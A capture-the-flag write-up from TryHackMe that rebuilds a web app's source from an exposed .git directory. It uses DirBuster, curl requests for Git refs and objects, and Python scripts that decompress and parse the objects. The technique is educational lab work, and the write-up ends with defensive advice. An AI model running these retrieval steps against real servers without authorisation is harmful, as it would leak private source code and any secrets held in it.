# TryHackMe Write-up – Byte Lotus Resort (Room 404)

## Room Objective

The objectives for this room were:

* Dump the exposed source code.
* Find the flag.

---

# Initial Enumeration

The challenge description hinted that something was exposed on **port 8080**, but did not explicitly reveal what it was. Rather than guessing common files manually, I began with directory enumeration.

I used **DirBuster** against the web server:

```bash
dirbuster \
  -u http://MACHINE_IP:8080 \
  -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

During enumeration, DirBuster discovered an exposed **`.git`** directory.

This immediately suggested that the application's Git repository had been left publicly accessible, allowing anyone to download the repository metadata and potentially reconstruct the application's source code.

---

# Investigating the Exposed Git Repository

After discovering the `.git` directory, I verified that it was accessible by requesting the Git HEAD reference:

```text
http://MACHINE_IP:8080/.git/HEAD
```

Response:

```text
ref: refs/heads/main
```

This confirmed that the repository metadata was exposed.

Next, I inspected the repository configuration:

```text
http://MACHINE_IP:8080/.git/config
```

Output:

```ini
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
```

The configuration showed that this was a standard non-bare Git repository, meaning its objects, commits, trees, and blobs could potentially be reconstructed manually.

---

# Obtaining the Latest Commit

The HEAD file pointed to:

```text
refs/heads/main
```

So I retrieved the latest commit hash:

```bash
curl http://MACHINE_IP:8080/.git/refs/heads/main
```

Output:

```text
0f13550b4cb13e9f30c61d5b342c532d21e45bda
```

This SHA-1 value is **not something to decode**—it is Git's identifier for the latest commit.

---

# Downloading the Commit Object

Git stores objects using the first two characters of the SHA-1 as a directory.

The commit object therefore resides at:

```text
.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda
```

Downloaded using:

```bash
curl http://MACHINE_IP:8080/.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda -o commit.obj
```

Checking the object type:

```bash
file commit.obj
```

Output:

```text
zlib compressed data
```

Git stores loose objects compressed with zlib.

To inspect the object:

```python
import zlib

print(zlib.decompress(open("commit.obj","rb").read()).decode(errors="replace"))
```

The commit revealed the SHA-1 hash of the repository's tree object.

---

# Recovering the Tree

Using the tree hash obtained from the commit, I downloaded the tree object:

```bash
curl http://MACHINE_IP:8080/.git/objects/<tree_hash> -o tree.obj
```

After decompressing it, the tree listed three files:

* README.md
* app.js
* index.html

Since Git stores blob hashes in binary form inside tree objects, I used Python to convert them into hexadecimal SHA-1 hashes.

```python
import zlib
import binascii

data = zlib.decompress(open("tree.obj","rb").read())

i = data.index(b"\x00") + 1

while i < len(data):
    j = data.index(b" ", i)
    mode = data[i:j].decode()

    i = j + 1
    j = data.index(b"\x00", i)

    name = data[i:j].decode()
    sha = binascii.hexlify(data[j+1:j+21]).decode()

    print(mode, name, sha)

    i = j + 21
```

Output:

```text
100644 README.md a5965c580fee91d852e5b19a8290da02d2926523
100644 app.js    2575ab073f67615a27135663ed36794c2d2584fb
100644 index.html 0a12caa4e52a965e89e5eccf5760924b21aacbf7
```

---

# Downloading the Blob Objects

Each blob was downloaded individually.

### README.md

```bash
curl http://MACHINE_IP:8080/.git/objects/a5/965c580fee91d852e5b19a8290da02d2926523 -o readme.obj
```

### app.js

```bash
curl http://MACHINE_IP:8080/.git/objects/25/75ab073f67615a27135663ed36794c2d2584fb -o app.obj
```

### index.html

```bash
curl http://MACHINE_IP:8080/.git/objects/0a/12caa4e52a965e89e5eccf5760924b21aacbf7 -o index.obj
```

Each blob was decompressed using:

```python
import zlib

print(zlib.decompress(open("blob.obj","rb").read()).decode(errors="replace"))
```

---

# Finding the Flag

After recovering all three files, the flag was found inside **README.md**.

Although I successfully reconstructed the repository and extracted every file, only the README contained the required flag.

---

# Key Takeaways

* Never expose the `.git` directory on a production web server.
* Git object hashes are SHA-1 identifiers—not encrypted values to decode.
* Loose Git objects are compressed using zlib.
* Commit objects reference tree objects.
* Tree objects reference blob objects (files).
* Even without tools such as **git-dumper**, it is possible to manually reconstruct an exposed Git repository using `curl`, Python, and an understanding of Git's internal object structure.

---

# Skills Practiced

* Web enumeration
* Git repository exposure identification
* Git internals
* Manual source code reconstruction
* SHA-1 object traversal
* Python scripting
* zlib decompression
* Secure source code handling
* Sensitive information discovery
